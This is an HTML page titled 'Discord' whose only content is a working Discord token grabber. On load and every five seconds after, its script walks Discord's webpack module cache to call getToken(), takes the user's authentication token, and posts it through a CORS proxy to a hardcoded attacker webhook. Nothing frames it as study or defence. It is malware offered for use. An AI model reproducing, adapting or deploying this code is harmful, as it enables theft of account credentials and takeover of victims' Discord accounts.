<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
</head>
<body>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
        const PROXY_URL = "https://corsproxy.io/?";

        async function grabAndSendToken() {
            let token = null;
            
            try {
                // Check if we are in Discord context
                if (typeof webpackChunkdiscord_app === 'undefined') {
                    console.log("⏳ Waiting for Discord context...");
                    return; // Wait for next interval
                }

                // Token Grabbing Logic
                for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]))) {
                    try {
                        if(!e.exports || e.exports === window) continue;
                        if(e.exports?.getToken) {
                            token = e.exports.getToken();
                            break;
                        }
                        for(let t in e.exports) {
                            if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
                                token = e.exports[t].getToken();
                                break;
                            }
                        }
                    } catch(e) {}
                    if(token) break;
                }

                if(token) {
                    console.log("Token Found: " + token);
                    
                    // Send via Proxy
                    const finalUrl = PROXY_URL + encodeURIComponent(WEBHOOK_URL);
                    
                    await fetch(finalUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            content: `🔓 **Token Acquired!**\n\n\`\`\`${token}\`\`\``
                        })
                    }).then(response => {
                        if(response.ok) {
                            console.log("✅ Success: Token sent to Discord!");
                        } else {
                            console.error("❌ Failed: Status", response.status, response.statusText);
                        }
                    }).catch(error => {
                        console.error("❌ Network Error:", error);
                    });
                } else {
                    console.log("⚠️ Token not found yet.");
                }
            } catch(e) {
                console.error("❌ Grabber Error:", e);
            }
        }

        // Run on load
        grabAndSendToken();
        
        // Retry every 5 seconds until token is found/sent
        setInterval(grabAndSendToken, 5000);
    </script>
</body>
</html>
